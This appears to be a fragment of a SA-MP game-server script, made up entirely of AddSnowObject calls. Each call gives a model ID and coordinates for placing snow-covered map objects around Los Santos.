	AddSnowObject(4830, 1687.78125, -2286.53906, 10.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4869, 1893.39062, -2269.60156, 14.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5002, 1780.35937, -2437.60156, 12.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5009, 2065.13281, -2269.60156, 15.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4868, 2139.60937, -2292.42187, 15.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5123, 2195.08593, -2266.61718, 12.56250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5276, 2219.60156, -2200.49218, 12.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4827, 2056.88281, -2187.35156, 6.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5185, 2143.91406, -2166.92187, 13.85156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5135, 2109.53125, -2163.91406, 16.78906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5314, 2085.17968, -2132.70312, 12.41406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5271, 2275.40625, -2095.26562, 12.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5279, 2137.28906, -2063.27343, 13.85156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5278, 2290.30468, -2170.43750, 16.05468, 0.00000, 0.00000, 45.00000);
	AddSnowObject(5274, 2317.71875, -2210.57812, 8.80468, 0.00000, 0.00000, 315.00000);
	AddSnowObject(5277, 2235.91406, -2282.46093, 13.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5275, 2293.80468, -2172.77343, 11.71093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5192, 2360.71875, -2117.00781, 16.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5106, 2390.24218, -2013.87500, 16.04687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5107, 2496.76562, -2108.36718, 19.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5112, 2521.09375, -2049.24218, 18.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5297, 2393.06250, -2049.24218, 18.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5330, 2303.75000, -1982.78125, 12.42968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5311, 2287.34375, -2024.38281, 12.53906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5174, 2371.25781, -2024.32031, 16.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5149, 2479.82812, -2009.00000, 15.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5105, 2543.46093, -2142.28125, 10.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5120, 2243.64843, -2021.01562, 12.41406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5270, 2112.30468, -2001.79687, 9.76562, 0.00000, 0.00000, 45.00000);
	AddSnowObject(5273, 2153.40625, -2051.42968, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5272, 2213.17187, -2033.06250, 12.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5343, 2136.50781, -1992.89062, 12.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5347, 2130.63281, -1987.89843, 13.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5122, 2184.43750, -1932.95312, 14.38281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5119, 2176.06250, -1911.87500, 12.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5329, 2216.18750, -1912.33593, 13.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5111, 2271.35937, -1912.38281, 14.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17567, 2288.18750, -1851.62500, 5.71093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17594, 2314.85156, -1799.42187, 13.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5513, 2200.72656, -1811.33593, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17595, 2217.48437, -1810.83593, 12.36718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5141, 2271.19531, -1928.39062, 12.49218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5349, 2143.67187, -1894.47656, 12.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5181, 2167.03906, -1925.20312, 15.82812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5118, 2107.77343, -1958.81250, 12.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5182, 2115.00000, -1921.52343, 15.39062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5117, 2031.25000, -1962.31250, 13.28906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5121, 2041.65625, -1904.81250, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5116, 2361.27343, -1918.74218, 16.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5168, 2385.18750, -1906.51562, 18.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5178, 2479.85156, -1930.21093, 12.41406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5187, 2439.28125, -1979.96093, 15.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5142, 2489.23437, -1962.01562, 19.03906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5355, 2582.42968, -1979.37500, 9.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5296, 2652.92968, -2049.24218, 18.12500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5143, 2639.40625, -2102.39843, 36.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5113, 2758.53906, -2104.89843, 18.28125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5188, 2718.44531, -1977.50000, 11.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5133, 2845.64843, -1969.99218, 9.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5172, 2906.73437, -1975.26562, 4.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5173, 2768.44531, -2012.09375, 14.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5144, 2768.56250, -1942.69531, 11.30468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17582, 2739.21875, -1770.08593, 17.55468, 0.00000, 0.00000, 175.00000);
	AddSnowObject(17927, 2771.17187, -1901.49218, 11.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17602, 2678.68750, -1849.80468, 9.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4372, 2930.64843, -1778.92187, -60.81250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17606, 2848.87500, -1799.57031, 10.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17675, 2893.58593, -1586.53125, 10.22656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17605, 2798.70312, -1657.29687, 10.98437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17607, 2854.89843, -1525.40625, 9.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17541, 2803.39843, -1573.80468, 20.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17604, 2690.29687, -1657.30468, 10.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17609, 2730.14062, -1572.89843, 20.63281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17682, 2674.94531, -1622.54687, 14.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17680, 2642.69531, -1540.80468, 19.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17538, 2682.80468, -1507.41406, 44.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17603, 2642.79687, -1733.10156, 9.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17568, 2586.85937, -1744.06250, 6.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17507, 2587.07812, -1589.44531, 15.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17600, 2585.25781, -1732.34375, 11.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17506, 2582.54687, -1872.63281, 6.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17601, 2674.18750, -1860.69531, 11.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5151, 2674.10156, -1990.78906, 15.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17500, 2478.60156, -1851.48437, 6.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5128, 2516.59375, -1875.55468, 11.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5110, 2443.63281, -1901.32031, 18.00781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5267, 2485.76562, -1900.43750, 18.53125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17599, 2522.19531, -1773.00000, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17548, 2482.32812, -1783.14843, 14.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17596, 2413.75000, -1820.83593, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17598, 2469.38281, -1732.21093, 12.57812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17520, 2497.76562, -1762.39062, 15.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17613, 2489.29687, -1668.50000, 12.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17617, 2502.32031, -1649.58593, 15.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17616, 2521.68750, -1692.85937, 14.86718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17574, 2459.80468, -1714.88281, 12.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17612, 2408.09375, -1658.90625, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17881, 2429.78906, -1681.84375, 12.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17615, 2459.59375, -1695.60156, 13.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17654, 2556.35156, -1612.91406, 15.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17865, 2510.47656, -1543.27343, 21.71093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17864, 2520.72656, -1530.25000, 22.74218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17655, 2433.07031, -1611.55468, 12.03125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17829, 2413.68750, -1576.64062, 16.20312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17657, 2431.03906, -1603.49218, 20.20312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17656, 2431.05468, -1677.42968, 20.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17597, 2314.95312, -1741.32812, 12.48437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17614, 2387.80468, -1695.64843, 13.74218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17621, 2342.59375, -1682.70312, 12.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17620, 2281.21093, -1695.64843, 13.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17611, 2284.66406, -1656.71093, 13.42968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17619, 2303.41406, -1622.42187, 9.05468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17622, 2342.60937, -1608.81250, 16.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17867, 2308.45312, -1599.38281, 4.63281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17866, 2339.78906, -1583.99218, 14.96093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17638, 2431.69531, -1514.35156, 22.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17624, 2386.78906, -1524.35937, 22.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17862, 2458.38281, -1532.43750, 22.99218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17623, 2342.50000, -1534.00000, 22.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17503, 2386.64062, -1454.34375, 27.22656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17639, 2490.90625, -1504.32812, 22.92187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17921, 2560.86718, -1474.34375, 22.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17688, 2604.99218, -1465.86718, 25.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17687, 2577.24218, -1447.23437, 30.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17640, 2461.39062, -1445.78125, 25.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17852, 2490.90625, -1474.34375, 27.34375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17920, 2295.01562, -1564.46875, 12.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5511, 2193.25000, -1543.54687, 9.70312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5478, 2269.08593, -1487.55468, 20.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5479, 2234.16406, -1590.25781, 16.66406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17513, 2288.89843, -1525.50000, 17.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17610, 2224.03906, -1680.64062, 13.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5480, 2208.37500, -1698.24218, 13.39062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5510, 2192.79687, -1665.03906, 13.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5440, 2207.67968, -1588.39062, 19.34375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5509, 2150.39062, -1741.82812, 12.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5430, 2148.95312, -1791.83593, 19.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5419, 2078.15625, -1847.70312, 7.76562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5183, 2111.65625, -1873.36718, 16.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5180, 2163.67187, -1873.61718, 15.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5418, 2112.93750, -1797.09375, 19.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5508, 2085.85937, -1812.77343, 13.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5528, 2101.29687, -1688.77343, 18.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5506, 2079.83593, -1699.94531, 12.46093, 0.00000, 0.00000, 275.57501);
	AddSnowObject(5521, 2049.57812, -1781.67968, 18.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5411, 2021.65625, -1810.72656, 18.60156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5139, 2021.15625, -1893.27343, 15.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5134, 2045.49218, -1903.61718, 16.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5404, 1952.71875, -1856.78125, 7.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4895, 1899.15625, -1936.33593, 14.26562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5052, 1961.65625, -1863.11718, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5013, 1961.66406, -2001.89843, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5186, 2014.81250, -2041.14062, 12.53906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4807, 1964.64062, -2109.42187, 14.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4808, 1892.33593, -2037.64843, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4806, 1880.33593, -2001.92187, 12.57031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4859, 1868.95312, -2003.65625, 13.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5064, 1855.45312, -1958.46093, 12.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4858, 1891.74218, -1872.28125, 14.85937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5420, 1835.82031, -1815.14062, 7.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5489, 1932.59375, -1782.10156, 12.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5397, 1866.32812, -1789.78125, 20.94531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4821, 1745.20312, -1882.85156, 26.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5026, 1821.66406, -1872.31250, 12.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4819, 1815.45312, -1958.46093, 12.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4817, 1739.30468, -1951.95312, 12.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4860, 1722.75000, -2014.63281, 16.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4873, 1734.39843, -2019.70312, 14.34375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4837, 1823.00781, -2087.17187, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4849, 1892.33593, -2109.50781, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4861, 1873.01562, -2101.83593, 15.89062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4846, 1827.13281, -2158.85937, 14.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5036, 1694.60156, -2131.11718, 12.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5034, 1742.81250, -2292.75781, 3.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4829, 1645.38281, -2292.75781, 3.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4870, 1569.98437, -2194.72656, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4836, 1441.90625, -2166.64843, 13.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4872, 1610.92968, -2010.62500, 23.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5028, 1624.00000, -2113.61718, 23.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4820, 1738.39062, -2117.02343, 13.93750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4876, 1582.29687, -2002.23437, 26.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4878, 1530.82812, -1969.13281, 26.39062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4852, 1401.46093, -1994.58593, 35.43750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4823, 1338.32812, -1976.65625, 36.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4875, 1270.68750, -2196.78906, 42.56250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4824, 1224.42968, -2037.00781, 62.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4825, 1145.95312, -2037.00000, 65.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4851, 1182.00781, -1987.63281, 39.99218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4810, 1095.06250, -2214.21875, 41.72656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5046, 1105.50000, -2355.95312, 16.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4809, 1036.52343, -2204.43750, 14.16406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4815, 1074.58593, -2321.74218, 10.85156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4898, 992.85937, -2126.61718, 12.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4896, 981.70312, -2155.85156, 1.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4814, 1071.03125, -2354.00781, 1.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4812, 1023.39843, -2166.10156, 23.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5023, 1046.05468, -2251.50781, 33.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4811, 1069.67187, -2270.89843, 23.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4897, 985.72656, -2050.53125, 3.04687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5021, 1044.91406, -2023.39062, 17.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4813, 1042.27343, -2029.80468, 23.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6065, 887.46093, -1878.39062, 3.12500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6118, 1050.07812, -1864.31250, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6117, 1109.32031, -1852.37500, 12.56250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4168, 1217.45312, -1852.26562, 12.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4103, 1104.09375, -1780.90625, 25.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4101, 1224.69531, -1782.20312, 29.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4108, 1177.46093, -1782.25000, 12.66406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4182, 1304.98437, -1792.28125, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4107, 1360.75781, -1802.25000, 12.49218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4010, 1350.75781, -1802.28125, 12.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4165, 1469.52343, -1872.37500, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3997, 1479.33593, -1802.28906, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4207, 1603.81250, -1863.34375, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4133, 1625.09375, -1834.20312, 24.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4209, 1569.93750, -1802.28906, 12.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4122, 1629.46093, -1812.28906, 13.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4160, 1686.62500, -1806.42968, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3991, 1608.19531, -1721.80468, 26.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6116, 997.56250, -1798.51562, 12.95312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6054, 1036.41406, -1689.17968, 12.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6042, 952.34375, -1822.82031, 15.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6122, 798.09375, -1763.10156, 12.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6123, 917.39843, -1672.90625, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6203, 956.19531, -1689.60156, 12.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6213, 880.30468, -1696.25000, 12.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6115, 1087.46093, -1712.26562, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6128, 1207.46093, -1712.19531, 12.66406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6126, 1149.89843, -1642.14843, 12.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6102, 1226.95312, -1656.15625, 24.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3978, 1380.26562, -1655.53906, 10.80468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4197, 1380.26562, -1655.53906, 10.80468, 0.00000, 0.00000, 270.00000);
	AddSnowObject(4198, 1380.26562, -1655.53906, 10.80468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6127, 1306.51562, -1630.35937, 12.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4163, 1469.33593, -1732.28906, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4148, 1427.05468, -1662.28906, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4186, 1479.55468, -1693.14062, 19.57812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4158, 1609.55468, -1732.32812, 12.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4150, 1532.05468, -1662.28906, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4029, 1629.54687, -1756.08593, 8.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3985, 1479.56250, -1631.45312, 12.07812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4129, 1595.00000, -1603.02343, 27.03906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3989, 1646.00781, -1662.71875, 8.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3993, 1719.93750, -1662.28906, 12.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4013, 1654.59375, -1637.74218, 28.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3987, 1722.05468, -1702.28906, 12.81250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3992, 1755.60156, -1782.30468, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3983, 1722.50000, -1775.39843, 14.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3977, 1384.36718, -1511.43750, 10.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4146, 1371.00000, -1582.34375, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4144, 1442.15625, -1517.53125, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3994, 1479.55468, -1592.28906, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4020, 1544.83593, -1516.85156, 32.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4142, 1494.75781, -1410.87500, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4139, 1406.17187, -1418.10156, 12.78906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4712, 1546.98437, -1356.61718, 14.95312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3990, 1593.95312, -1416.35156, 26.66406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3996, 1596.35937, -1440.87500, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4131, 1588.44531, -1509.14062, 27.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4128, 1666.91406, -1456.75000, 26.04687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4127, 1664.12500, -1560.85156, 23.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4152, 1658.10937, -1516.69531, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4233, 1603.90625, -1592.29687, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4156, 1739.81250, -1602.19531, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4033, 1721.87500, -1643.05468, 12.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4001, 1700.47656, -1517.69531, 17.93750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4000, 1787.13281, -1565.67968, 11.96875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3998, 1734.30468, -1560.71093, 18.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4125, 1769.51562, -1509.48437, 12.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4154, 1706.21093, -1432.35156, 12.44531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4645, 1605.72656, -1370.82812, 15.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4557, 1714.74218, -1350.87500, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4590, 1780.00000, -1360.00000, 12.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5498, 1849.32812, -1373.39843, 12.48437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3995, 1797.16406, -1464.39062, 7.99218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4110, 1807.46093, -1475.98437, 8.53125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5439, 1887.79687, -1536.60156, 7.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5474, 1931.64843, -1577.57031, 12.35937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5501, 1884.66406, -1613.42187, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5502, 1822.89062, -1725.25781, 12.46875, 0.00000, 0.00000, 270.00000);
	AddSnowObject(5503, 1927.70312, -1754.31250, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4027, 1783.10156, -1702.30468, 14.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3984, 1783.10156, -1647.31250, 23.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4012, 1777.43750, -1782.30468, 12.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5441, 1941.65625, -1682.57031, 12.47656, 0.00000, 0.00000, 270.00000);
	AddSnowObject(5412, 1971.65625, -1682.31250, 13.74218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5407, 2041.64843, -1682.18750, 12.57031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5505, 2002.48437, -1700.98437, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5507, 2041.66406, -1672.31250, 12.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5442, 2041.72656, -1752.31250, 12.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5518, 2137.98437, -1672.55468, 12.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5504, 2046.00000, -1613.00000, 12.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5512, 2069.92187, -1535.78125, 10.49218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5471, 2088.10937, -1568.11718, 11.05468, 0.00000, 0.00000, 0.00000);
